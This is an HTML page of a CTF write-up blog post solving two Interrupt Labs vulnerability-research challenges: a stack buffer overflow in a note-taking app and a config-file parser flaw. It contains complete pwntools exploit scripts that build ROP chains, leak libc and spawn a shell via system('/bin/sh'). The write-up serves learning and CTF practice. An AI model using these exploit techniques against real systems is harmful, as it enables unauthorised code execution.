<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>interruptlabsCTF | PwndSide</title><meta name=keywords content="pwn"><meta name=description content="I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/interruptlabsctf/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/interruptlabsctf/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="interruptlabsCTF"><meta property="og:description" content="I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-06T19:26:52+02:00"><meta property="article:modified_time" content="2025-07-06T19:26:52+02:00"><meta property="article:tag" content="Pwn"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="interruptlabsCTF"><meta name=twitter:description content="I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"interruptlabsCTF","item":"https://pwndside.github.io/posts/interruptlabsctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"interruptlabsCTF","name":"interruptlabsCTF","description":"I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things.","keywords":["pwn"],"articleBody":"I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things.\nSo here I am today writing up two of the VR challenge they found interesting and, eventually, getting the chance to be interviewed by them.\nHonestly, the first time I saw the challenges two years ago, they were very complicated. With my limited knowledge at the time, I struggled to complete the last pieces of the puzzle.\nToday, I can gladly say that I completed them quite easily, though there were some tricky parts that I found really interesting.\nThe takeaways from this is that persistence and continuous learning make even the most daunting challenges achievable, what seems impossible today can become manageable tomorrow.\nINDEX The Note Taking App User Input The Note Taking App Once executes a contextual menu is shown with three options, let’s see what they do with IDA.\nAs seen earlier. the main function starts printing the contextual menu and expecting a number.\nBased on which option we have chosen, there are three execution paths\nIf we chose to create a note, the binary checks whether 0x14 notes have already been created. If not, it still allows us to create a new one.\nThen write_note is called with the top of the stack as argument.\nscanf without proper checks and writes directly to the stack what could go wrong?\nHere we have a basic example of a buffer overflow which, due to the absence of a stack canary and ASLR, should be relatively easy to exploit.\nThe limitation here is that we must take into account that 0xc0 bytes from the input will be copied onto the top of the previous rsp.\nMy plan is to craft a ROP chain that calls printf from the PLT, passing a populated GOT entry as the first argument to leak a libc address.\nTo overcome the limitation mentioned earlier, we should put everything which is placed at the top of previous rsp at the start of the payload.\nio = start() io.sendline(\"1\") rop = ROP(exe) pop_rdi_ret = rop.find_gadget([\"pop rdi\" , \"ret\"]).address ret = rop.find_gadget([\"ret\"]).address payload = p64(exe.got.printf) + p64(ret) + p64(exe.sym.printf) + p64(ret) + p64(0x401196) payload = payload + b\"A\"* (0xd8 - len(payload)) + p64(pop_rdi_ret) io.sendlineafter(b\"Enter Note Below\", payload) io.recvline() leak = u64(io.recvline().strip().ljust(8,b\"\\x00\")) log.info(\"Leak: \" + hex(leak)) Also worth to mention that in order to spawn a shell at the end of the ROP chain we are returning to the vulnerable subroutine.\nIn the second stage, as the stack has been manipulated, we do not have to pay attention to the above limitation.\n#!/usr/bin/env python3 from pwn import * exe = context.binary = ELF(args.EXE or './challenge_1') libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.log_level = 'debug' def start(argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) gdbscript = ''' start '''.format(**locals()) io = start() io.sendline(\"1\") rop = ROP(exe) pop_rdi_ret = rop.find_gadget([\"pop rdi\" , \"ret\"]).address ret = rop.find_gadget([\"ret\"]).address payload = p64(exe.got.printf) + p64(ret) + p64(exe.sym.printf) + p64(ret) + p64(0x401196) payload = payload + b\"A\"* (0xd8 - len(payload)) + p64(pop_rdi_ret) io.sendlineafter(b\"Enter Note Below\", payload) io.recvline() leak = u64(io.recvline().strip().ljust(8,b\"\\x00\")) log.info(\"Leak: \" + hex(leak)) libc.address = leak - 0x61c90 log.info(\"Libc base: \" + hex(libc.address)) rop = ROP(libc) binsh = next(libc.search(b\"/bin/sh\\x00\")) payload = p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(libc.sym.system) payload = b\"A\"*0xd8 + payload io.sendlineafter(b\"Enter Note Below\", payload) io.interactive() .jpg)\nUser Input Before start reversing the binary, let’s play a little with it.\nIf executed the binary asks for config file as argument, so I crafted a config file with random values to see the binary behaviour.\nNothing useful from here, so let’s dive into reversing to get a better overview.\nThe flow of the main function starts by checking whether enough arguments are provided or if the help option is included. If there aren’t enough arguments or the help option is specified, a help subroutine is called.\nIf a config file is specified, it is opened, and the file descriptor along with a freshly malloced memory buffer are passed as arguments to readFromFd.\nreadFromFd makes a bunch of read from the fd into heap, leaking us the structure of the config file. To simplify the subroutine, I will let a simple diagram showcasing the structure.\nThe diagram splits config file in sections, the blue addresses indicate where each section will be written, and on the left side of each section, in black, the size of that section is displayed.\nFirst, we read two bytes from fd, which represent the size of the next read. The next read is placed directly in the heap, is worth to mention that only the last byte of the size is actually used.\nThen, two more bytes are read, which will be compared with the bytes rR stored in the data section.\nIf the memory blocks aren’t identical, the function exits with eax equal to 0 (the return value is gonna be useful afterwards :P), if the blocks don’t differ then the function will still reading more bytes from fd.\n4 bytes are read into [heap + 0x44]\nFinally, we encounter a similar pattern, two bytes are read, indicating the size of the upcoming read, the next read is then stored into [heap + 0x32].\nThis time the eax value is the signed extended addition of (size1 + size2 + 0xC)\nAs mentioned before is very handy to have the diagram for clarifying the process.\nDepending on the previously mentioned exit value, there are two possible execution paths. As we don’t have any clue of what this value is used for, let’s start with anyone\nFrom this point, the main function starts to look quite overwhelming, with many different types of operations. In those cases, I like to search for vulnerable stuff first and try to understand in later stages (This has prevented me from falling into a lot of rabbit holes).\nThis block caught my attention because, it copies exitVal bytes from heap to rsp and calls the function saved at [heap+0x48] .\nSince this is the path where the exit value equals (size1 + size2 + 0xC) and there is no modification of the heap on the process, we gain a write primitive to rsp and the ability to call a function of our choice. These are all the ingredients needed to achieve code execution.\nSo let’s outline a plan, the main idea is taking advantage of stack write primitive by writing the ROP chain in the heap as later will be copied into rsp and place a pointer to a function on the position [heap+0x48] so execution returns directly to rsp.\nThis is how should look our config file.\nIn order to craft a proper ROP chain to call system and spawn a shell, a libc leak will be needed, we can achieve that invoking printf from the PLT and passing a populated GOT entry as the first argument (in our case, I used read).\nrop = ROP(exe) pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764) pad = payload + b'A'*(0x32 - len(payload)) heap = b'A'*0x16 + p64(pop_rdi) data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap config_path = \"config_file_path\" f = open(config_path, \"wb\") f.write(data) f.flush() The binary gadget pop_rdi is placed into [heap+0x48] so execution returns directly to rsp. Is worth to mention that the end of our ROP chain loops back to copyFromFd in main, allowing us to repeat the attack.\nNicee we got a libc leak, let’s place the actual ROP chain to spawn a shell, appending the new config file to the existing file will do the trick.\nfrom pwn import * exe = ELF(\"./challenge_2\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.log_level = 'debug' def start(argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) gdbscript = ''' start '''.format(**locals()) rop = ROP(exe) pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764) pad = payload + b'A'*(0x32 - len(payload)) heap = b'A'*0x16 + p64(pop_rdi) data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap config_path = \"config_file_path\" f = open(config_path, \"wb\") f.write(data) f.flush() io = start([config_path]) leak = io.recv(6).strip().ljust(8,b\"\\x00\") libc.address = u64(leak) - 0x10e1e0 binsh = next(libc.search(b\"/bin/sh\\x00\")) payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym.system) pad = payload + b'A'*(0x32 - len(payload)) heap = b'A'*0x16 + p64(pop_rdi) data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x20) + heap f.write(data) f.flush() io.interactive() As expected the binary finishes execution before we can append the second stage to the config file. To keep it alive long enough, we need to prevent it from exiting. For this reason, I chose to repeat the first stage 10,000 times.\nfrom pwn import * exe = ELF(\"./challenge_2\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.log_level = 'debug' def start(argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) gdbscript = ''' start '''.format(**locals()) rop = ROP(exe) pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764) pad = payload + b'A'*(0x32 - len(payload)) heap = b'A'*0x16 + p64(pop_rdi) data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap config_path = \"config_file_path\" f = open(config_path, \"wb\") for i in range(10000): f.write(data) f.flush() io = start([config_path]) leak = io.recv(6).strip().ljust(8,b\"\\x00\") libc.address = u64(leak) - 0x10e1e0 binsh = next(libc.search(b\"/bin/sh\\x00\")) payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym.system) pad = payload + b'A'*(0x32 - len(payload)) heap = b'A'*0x16 + p64(pop_rdi) data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x20) + heap f.write(data) f.flush() io.interactive() ","wordCount":"1664","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2025-07-06T19:26:52+02:00","dateModified":"2025-07-06T19:26:52+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/interruptlabsctf/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">interruptlabsCTF</h1><div class=post-meta><span title='2025-07-06 19:26:52 +0200 CEST'>July 6, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1664 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/interruptlabsctf.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=post-content><p>I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ <a href=https://www.interruptlabs.co.uk/articles/heimdallr-a-way-to-integrate-ida-pro-into-obsidian-notes>blog</a>. They had this cool post about <strong>integrating IDA with Obsidian</strong>, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-1.png></p><p>So here I am today writing up two of the VR challenge they found interesting and, eventually, getting the chance to be interviewed by them.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-2.png></p><p>Honestly, the first time I saw the challenges two years ago, they were very complicated. With my <strong>limited knowledge</strong> at the time, I struggled to complete the last pieces of the puzzle.</p><p>Today, I can gladly say that <strong>I completed them quite easily</strong>, though there were some tricky parts that I found really interesting.</p><p>The <strong>takeaways</strong> from this is that persistence and continuous learning make even the most daunting challenges achievable, <strong>what seems impossible today can become manageable tomorrow.</strong></p><h2 id=index>INDEX<a hidden class=anchor aria-hidden=true href=#index>#</a></h2><ul><li><a href=https://pwndside.github.io/posts/interruptlabsctf/#the-note-taking-app>The Note Taking App</a></li><li><a href=https://pwndside.github.io/posts/interruptlabsctf/#user-input>User Input</a></li></ul><h2 id=the-note-taking-app>The Note Taking App<a hidden class=anchor aria-hidden=true href=#the-note-taking-app>#</a></h2><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-3.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-4.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-5.png></p><p>Once executes a contextual menu is shown with three options, let’s see what they do with <strong>IDA</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-6.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-7.png></p><p>As seen earlier. the <code>main</code> function starts printing the <strong>contextual menu</strong> and expecting a number.</p><p>Based on which option we have chosen, there are three execution paths</p><p>If we chose to <strong>create a note</strong>, the binary checks whether 0x14 notes have already been created. If not, it still allows us to create a new one.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-8.png></p><p>Then <code>write_note</code> is called with the <strong>top of the stack</strong> as argument.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-9.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-10.png></p><p><code>scanf</code> without proper checks and writes directly to the stack <strong>what could go wrong?</strong></p><p>Here we have a basic example of a <strong>buffer overflow</strong> which, due to the absence of a <strong>stack canary</strong> and <strong>ASLR</strong>, should be relatively <strong>easy to exploit</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-11.png></p><p>The <strong>limitation</strong> here is that we must take into account that <code>0xc0</code> bytes from the input will be copied onto the <strong>top of the previous</strong> <code>rsp</code>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-12.png></p><p>My plan is to craft a <strong>ROP chain</strong> that calls <code>printf</code> from the <strong>PLT</strong>, passing a populated <strong>GOT</strong> entry as the first argument to leak a <strong>libc address</strong>.</p><p>To overcome the limitation mentioned earlier, we should put everything which is placed at the top of previous <code>rsp</code> at the start of the payload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;pop rdi&#34;</span> <span class=p>,</span> <span class=s2>&#34;ret&#34;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;ret&#34;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401196</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span> <span class=p>(</span><span class=mh>0xd8</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter Note Below&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Leak: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>))</span>
</span></span></code></pre></div><p>Also worth to mention that in order to spawn a shell at the end of the <strong>ROP chain</strong> we are returning to <strong>the vulnerable subroutine.</strong></p><p>In the second stage, as the <strong>stack has been manipulated</strong>, we do not have to pay attention to the above <strong>limitation</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>EXE</span> <span class=ow>or</span> <span class=s1>&#39;./challenge_1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;tmux&#34;</span><span class=p>,</span> <span class=s2>&#34;splitw&#34;</span><span class=p>,</span> <span class=s2>&#34;-h&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>start
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;pop rdi&#34;</span> <span class=p>,</span> <span class=s2>&#34;ret&#34;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;ret&#34;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401196</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span> <span class=p>(</span><span class=mh>0xd8</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter Note Below&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Leak: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>leak</span> <span class=o>-</span> <span class=mh>0x61c90</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>libc</span><span class=p>)</span>
